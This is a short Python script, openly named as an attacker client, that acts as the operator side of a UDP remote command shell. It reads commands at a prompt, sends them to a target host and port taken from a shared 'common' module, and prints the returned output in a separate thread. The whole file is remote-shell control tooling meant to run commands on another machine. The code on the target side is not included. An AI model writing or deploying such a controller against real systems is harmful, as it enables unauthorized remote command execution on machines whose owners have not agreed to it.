import json
import socket
from threading import Thread
from time import sleep

from common import host, port, port_attacker, dumps, loads

sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sender.bind((host, port_attacker))


class Attacker(object):
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self._takes_input = True

    def is_ready(self):
        print(self._takes_input)
        return self._takes_input

    def start_attack(self,):
        sock = self.sock
        while True:
            cmd = input("$ ")
            msg = dumps(cmd.split())
            sock.send(msg)
            sleep(0.5)

    def receive_response(self):
        while True:
            (data, _addr) = self.sock.recvfrom(4096)
            print("Response:", self._parse_resp(data))

    def _parse_resp(self, d: bytes):
        data = loads(d).get("args")
        return "\n".join(data)

    def connect(self, *args):
        return self.sock.connect(args)

    def start(self):
        self._send_thread = Thread(target=self.start_attack)
        self._recv_thread = Thread(target=self.receive_response)
        self._send_thread.start()
        self._recv_thread.start()


def run():
    print("connecting to port:", port)
    attacker = Attacker(sender)
    attacker.connect(host, port)
    attacker.start()


run()

